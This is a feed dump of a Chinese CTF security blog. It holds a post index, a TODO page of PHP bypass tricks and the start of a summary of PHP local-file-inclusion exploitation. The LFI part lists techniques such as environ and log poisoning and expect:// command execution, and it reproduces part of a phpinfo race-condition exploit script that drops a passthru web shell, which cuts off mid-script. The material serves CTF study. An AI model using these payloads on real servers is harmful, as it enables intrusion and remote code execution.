href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li></ul><h1 id="Python"><strong>Python</strong></h1><h2 id="Python编程">Python编程</h2><ul><li><p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p></li><li><p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p></li><li><p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p></li><li><p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p></li><li><p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p></li><li><p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p></li></ul><h1 id="Java"><strong>Java</strong></h1><h2 id="Java编程">Java编程</h2><ul><li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li><li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li><li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li><li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li></ul><h1 id="算法"><strong>算法</strong></h1><h2 id="Leetcode">Leetcode</h2><ul><li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li></ul><h1 id="随笔"><strong>随笔</strong></h1><h2 id="经验">经验</h2><ul><li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li></ul><h2 id="技术">技术</h2><ul><li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li><li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li><li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li><li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li><li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文章归档&quot;&gt;&lt;a href=&quot;/archives/index.html&quot;&gt;&lt;strong&gt;文章归档&lt;/strong&gt;&lt;/a&gt;&lt;/h1&gt;
&lt;h1 id=&quot;置顶文章&quot;&gt;&lt;strong&gt;置顶文章&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;/Othe
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://ca0y1h.top/home/"/>
    <id>http://ca0y1h.top/home/</id>
    <published>2020-09-26T11:57:04.671Z</published>
    <updated>2020-10-19T02:28:42.875Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><figcaption><span>wiki</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> _____       ___   _____   ___   _   _        _____   _       _____   _____  </span><br><span class="line">&#x2F;  ___|     &#x2F;   | &#x2F;  _  \ |_  | | | | |      |  _  \ | |     &#x2F;  _  \ &#x2F;  ___| </span><br><span class="line">| |        &#x2F; &#x2F;| | | | | |   | | | |_| |      | |_| | | |     | | | | | |     </span><br><span class="line">| |       &#x2F; &#x2F; | | | |&#x2F;| |   | | |  _  |      |  _  | | |     | | | | | |  _  </span><br><span class="line">| |___   &#x2F; &#x2F;  | | | |_| |   | | | | | |      | |_| | | |___  | |_| | | |_| | </span><br><span class="line">\_____| &#x2F;_&#x2F;   |_| \_____&#x2F;   |_| |_| |_|      |_____&#x2F; |_____| \_____&#x2F; \_____&#x2F; </span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><strong>ca01h@星盟安全</strong></p><p>NTExOTY1NzM4QHFxLmNvbQ==</p></blockquote><p>互联网时代的知识是零散的，需要有一个写字的地方，把零散的知识汇聚起来，以点连线，以线聚面，一方面能形成一个完整的知识体系，另一方面自己所需之时方便查阅，于是乎就诞生了<strong>ca01hの笔记本</strong>。</p><h2 id="TODO-LIST">TODO LIST</h2><h3 id="2020">2020</h3><p><strong>【未完成】SCTF复盘：<a href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web</a></strong></p><p><strong>【未完成】<a href="https://bycsec.top/2020/08/05/Thinkphp-vuln/">Thinkphp-vuln</a></strong></p><h4 id="October">October</h4><ul><li><p><strong><s>【已完成】Yii2反序列化POP链分析</s></strong></p></li><li><p><strong>【未完成】<a href="https://www.gem-love.com/ctf/2634.html#babyback">巅峰极客Babyback复盘</a></strong></p></li><li><p><strong>【未完成】DataCon复盘（阶段二）</strong></p></li><li><p><strong>【未完成】星盟公开课准备工作</strong></p></li><li><p><strong>【未完成】论文开题报告</strong></p></li><li><p><s><strong>【已完成】xmctf出题</strong></s></p></li><li><p><strong>【未完成】CTFShow刷题</strong></p></li><li><p><s><strong>【已完成】HTB Doctor靶机</strong></s></p></li></ul><h4 id="September">September</h4><ul><li><s><strong>【已完成】实习+HW</strong></s></li><li><s><strong>【已完成】DataCon复盘（阶段一）</strong></s></li><li><s><strong>【已完成】2020巅峰极客CTF</strong></s></li></ul><h4 id="August">August</h4><ul><li><s><strong>【已完成】XCTF——WMCTF</strong>（有幸做了一个签到题</s></li><li><s><strong>【已完成】DataCon2020 DNS恶意流量分析</strong>（有幸混了一个鼓励奖</s><ul><li>DNS恶意域名分析<ul><li><a href="https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg">https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg</a></li></ul></li><li>加密恶意流量检测<ul><li>初赛：<a href="https://s1mple.online/2020/08/09/DataCon2020-%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%88%9D%E8%B5%9B-Writeup-%E5%8F%8A%E6%80%BB%E7%BB%93%E5%8F%8D%E6%80%9D/">https://s1mple.online/2020/08/09/DataCon2020-加密恶意流量检测初赛-Writeup-及总结反思/</a></li></ul></li><li>僵尸网络分析<ul><li>第一题：<a href="https://www.cdxy.me/?p=829">https://www.cdxy.me/?p=829</a></li><li>第三题：<a href="https://zhuanlan.zhihu.com/p/186948840">https://zhuanlan.zhihu.com/p/186948840</a></li></ul></li><li>网络黑产分析</li><li>恶意代码分析<ul><li><a href="https://github.com/yuriufo/DataCon2020">https://github.com/yuriufo/DataCon2020</a></li><li><a href="https://zhuanlan.zhihu.com/p/187535672">https://zhuanlan.zhihu.com/p/187535672</a></li><li><a href="https://zhuanlan.zhihu.com/p/185715807">https://zhuanlan.zhihu.com/p/185715807</a></li></ul></li></ul></li><li><s><strong>【已完成】首届钓鱼城杯CTF</strong></s></li><li><s><strong>【已完成】HW</strong></s></li><li><s><strong>【已完成】<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#htaccess">文件解析漏洞</a></strong></s></li><li><strong>【未完成】《机器学习实战》前七章</strong></li><li><s><strong>【已完成】BUUCTF刷题</strong></s></li><li><strong>【未完成】HackTheBox OpenKeys（账号又被封了。。。</strong></li><li><s><strong>【已完成】PHP构造反序列化链再学习</strong></s></li></ul><h4 id="July">July</h4><ul><li><p><s><strong>【已完成】第五空间CTF复盘</strong></s></p></li><li><p><s><strong>【已完成】DASCTF七月赛复盘</strong></s></p></li><li><p><strong><s>【已完成】CSICTF2020复盘</s></strong></p></li><li><p><s><strong>【已完成】2020电信天翼杯CTF</strong></s></p></li><li><p><strong>【未完成】SUCTF2019 Upload2</strong></p></li><li><p><strong>【未完成】N1CTF2018 Easy&amp;&amp;Hard PHP</strong></p><p><a href="https://xz.aliyun.com/t/2148">https://xz.aliyun.com/t/2148</a></p><p><a href="https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499">https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499</a></p></li><li><p><strong>【未完成】<a href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Flask/Jinja2 SSTI &amp;&amp; Python 沙箱逃逸基础</a></strong></p></li><li><p>【<strong>未完成】<a href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/">PHP写配置漏洞</a></strong></p></li><li><p><strong>【未完成】<a href="https://www.smi1e.top/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/">PHP弱类型比较</a></strong></p></li><li><p><strong>【未完成】<a href="https://zeroyu.xyz/2020/06/04/Code-breaking-Puzzles-2018-Note">Code Breaking 2018挑战赛学习——正则回溯</a></strong></p></li><li><p><s><strong>【已完成】HackTheBox Tabby</strong></s></p></li><li><p><s><strong>【已完成】HackTheBox Sneakymailer</strong></s></p></li><li><p><strong>【未完成】Flask Pin码安全</strong></p></li></ul><h4 id="June">June</h4><ul><li><p><s>【已完成】<strong>RCTF2020</strong></s>（被完虐。。😭纯粹靠着队里的pwn师傅抬着走)</p></li><li><p><s>【已完成】<strong>PHP反序列化——Phar</strong></s></p></li><li><p><s>【已完成】<strong>PHP反序列化——Session</strong></s></p></li><li><p>【未完成】<strong>新春战役 Hackme</strong>：<a href="https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme">https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme</a></p><ul><li><strong>filter_var绕过</strong>：<a href="https://www.secpulse.com/archives/67064.html">https://www.secpulse.com/archives/67064.html</a></li><li><strong>绕过四个字符限制getshell</strong>：<a href="https://www.anquanke.com/post/id/87203">https://www.anquanke.com/post/id/87203</a></li></ul></li><li><p><s>【已完成】<strong>PHP反序列化——Soapclient</strong></s></p><ul><li><strong>LCTF bestphp’s revenge</strong></li></ul></li><li><p><s>【未完成】<strong>PHP反序列化——字符逃逸</strong></s></p></li><li><p>【未完成】<a href="https://yanmymickey.github.io/2020/04/14/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"><strong>PHP反序列化——Bypass</strong></a></p></li><li><p><s>【未完成】<strong>代码审计学习——PHP-Audit-Code Day1-6</strong></s></p></li><li><p>【未完成】<a href="https://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#GOPHER"><strong>phpinfo中的关键信息</strong></a></p></li><li><p>【未完成】<strong>Redis安全学习</strong></p></li><li><p><s>【已完成】<strong>BUUCTF刷题</strong></s></p></li><li><p><s>【已完成】<strong>XMCTF解题</strong></s></p></li><li><p><s>【已完成】<strong>第五空间CTF比赛（2020.06.24）</strong>（菜就一个字。。。）</s></p></li><li><p><s>【已完成】<strong>队内AWD训练赛（2020.06.28）</strong></s></p></li></ul><h2 id="Awesome-Articals-Projects">Awesome Articals/Projects</h2><h3 id="Linux入侵检测">Linux入侵检测</h3><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><h3 id="红蓝对抗">红蓝对抗</h3><p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></p><p><a href="https://github.com/hudunkey/Red-Team-links">https://github.com/hudunkey/Red-Team-links</a></p><h3 id="代码审计">代码审计</h3><p><a href="https://github.com/CHYbeta/Code-Audit-Challenges">https://github.com/CHYbeta/Code-Audit-Challenges</a></p><p><a href="https://github.com/hongriSec/PHP-Audit-Labs">https://github.com/hongriSec/PHP-Audit-Labs</a></p><h3 id="WAF">WAF</h3><p><a href="https://wh0ale.github.io/2019/12/04/waf%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0Bypass/">https://wh0ale.github.io/2019/12/04/waf从入门到Bypass/</a></p><p><a href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756">https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756</a></p><h3 id="java安全">java安全</h3><p><a href="https://github.com/threedr3am/learnjavabug">https://github.com/threedr3am/learnjavabug</a></p><h3 id="Python安全">Python安全</h3><p><a href="https://github.com/bit4woo/python_sec">https://github.com/bit4woo/python_sec</a></p><h3 id="字典">字典</h3><p><a href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a></p><h3 id="求职">求职</h3><p><a href="https://github.com/geekcompany/ResumeSample">https://github.com/geekcompany/ResumeSample</a></p><p><a href="https://github.com/zhaoweiho/web-sec-interview">https://github.com/zhaoweiho/web-sec-interview</a></p><p><a href="https://github.com/EvilAnne/Pentest_questions">https://github.com/EvilAnne/Pentest_questions</a></p><h2 id="Bypass-Tricks">Bypass &amp; Tricks</h2><h3 id="PHP">PHP</h3><h4 id="preg-match绕过">preg_match绕过</h4><blockquote><p>参考文章：<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p></blockquote><ul><li>数组绕过</li><li>PCRE回溯限制（code-breaking2018）</li><li>换行符</li></ul><h4 id="PHP字符串解析特性绕过">PHP字符串解析特性绕过</h4><blockquote><p>参考文章：<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p></blockquote><p>借用一张图简单地记一下</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708203746.png" alt=""></p><h4 id="SSRF-file协议绕过">SSRF file协议绕过</h4><p>如果SSRF中<code>file://</code>关键字被禁用，可以使用<code>file:/</code>或者<code>file:///</code>来代替。</p><p>例题：<a href="https://buuoj.cn/challenges#%5BGKCTF2020%5DEZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb">[GKCTF2020]EZ三剑客-EzWeb</a></p><h4 id="Session绕过">Session绕过</h4><p>删除cookie，没有cookie中的SESSIONID就找不到对应的session文件，相应的<code>$_SESSION['var']</code>就为NULL，相当于传参NULL。</p><p>例题：<a href="https://buuoj.cn/challenges#%5BBJDCTF%202nd%5D%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B">BJDCTF2nd 文件探测</a></p><h4 id="利用数组绕过">利用数组绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">ereg(pattern,<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line">strcmp(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strpos(<span class="keyword">Array</span>(),<span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure><p>例题：<a href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">0CTF2016 piapiapia</a></p><h4 id="basename绕过">basename绕过</h4><p>从 <a href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a> 找到了<code>basename()</code>函数的一个问题，它会去掉文件名开头的非ASCII值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(basename(<span class="string">&quot;xffconfig.php&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br><span class="line">var_dump(basename(<span class="string">&quot;config.php/xff&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure><p>例题：<a href="https://buuoj.cn/challenges#%5BZer0pts2020%5DCan%20you%20guess%20it?">[Zer0pts2020]Can you guess it?</a></p><h4 id="htaccess利用">.htaccess利用</h4><p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks总结</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;figcaption&gt;&lt;span&gt;wiki&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHP LFI利用总结</title>
    <link href="http://ca0y1h.top/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://ca0y1h.top/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</id>
    <published>2020-09-21T02:17:16.000Z</published>
    <updated>2020-10-19T02:32:44.147Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-LFI利用总结">PHP LFI利用总结</h1><blockquote><p>参考文章：<a href="https://www.anquanke.com/post/id/177491">https://www.anquanke.com/post/id/177491</a></p></blockquote><h2 id="proc-self-environ">proc/self/environ</h2><p><strong>前置条件</strong></p><ul><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ul><p><strong>利用方式</strong></p><p>如果可以读取，修改<code>User-Agent</code>为php代码，然后lfi点包含，实现rce。</p><h2 id="proc-self-fd-1-2-3…">proc/self/fd/1,2,3…</h2><p><strong>前置条件</strong></p><ul><li><p>php以cgi方式运行。</p></li><li><p>environ文件存储位置已知，且environ文件可读。</p></li></ul><p>类似于<code>/proc/self/environ</code>，不同是在<code>referer</code>或报错等写入php代码，然后lfi点包含，实现rce。</p><h2 id="PHP伪协议">PHP伪协议</h2><h3 id="常用伪协议">常用伪协议</h3><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921104109.png" alt=""></p><h3 id="expect">expect://</h3><p><strong>前置条件</strong></p><ul><li>默认不开启，需要安装PECL package扩展</li><li>需要<code>allow_url_include</code>开启</li></ul><p><strong>利用方式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expect:&#x2F;&#x2F;[command]</span><br></pre></td></tr></table></figure><h2 id="日志">日志</h2><h3 id="Apache日志">Apache日志</h3><p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p><p>CTF实例：</p><p><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two</a></p><h2 id="with-phpinfo">with phpinfo</h2><p>在可以访问phpinfo的情况下，疯狂上传大文件，同时在phpinfo中可以看到上传的文件在tmp目录下的文件名，条件竞争，在文件被删除之前包含进来getshell。</p><p>利用脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line">def setup(host, port):</span><br><span class="line">    TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD=<span class="string">&quot;&quot;</span><span class="string">&quot;%sr</span></span><br><span class="line"><span class="string">&lt;?php <span class="subst">$c</span>=fopen(&#x27;/tmp/g&#x27;,&#x27;w&#x27;);fwrite(<span class="subst">$c</span>,&#x27;&lt;?php passthru(<span class="subst">$_GET</span>[&quot;</span>f<span class="string">&quot;]);?&gt;&#x27;);?&gt;r&quot;</span><span class="string">&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">&quot;&quot;</span><span class="string">&quot;-----------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>dummyname<span class="string">&quot;; filename=&quot;</span>test.txt<span class="string">&quot;r</span></span><br><span class="line"><span class="string">Content-Type: text/plainr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--r&quot;</span><span class="string">&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">&quot;&quot;</span><span class="string">&quot;POST /phpinfo.php?a=&quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot; HTTP/1.1r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;</span><span class="string">&quot;&quot;</span> + padding + <span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Length: %sr</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s&quot;</span><span class="string">&quot;&quot;</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script</span></span><br><span class="line"><span class="comment">#     LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s%%00 HTTP/1.1r</span></span><br><span class="line"><span class="comment"># User-Agent: Mozilla/4.0r</span></span><br><span class="line"><span class="comment"># Proxy-Connection: Keep-Aliver</span></span><br><span class="line"><span class="comment"># Host: %sr</span></span><br><span class="line"><span class="comment"># r</span></span><br><span class="line"><span class="comment"># r</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line">    LFIREQ=<span class="string">&quot;&quot;</span><span class="string">&quot;GET /lfi.php?file=%s HTTP/1.1r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Aliver</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):</span><br><span class="line">    s = socket.socket(socket.AF_INET, 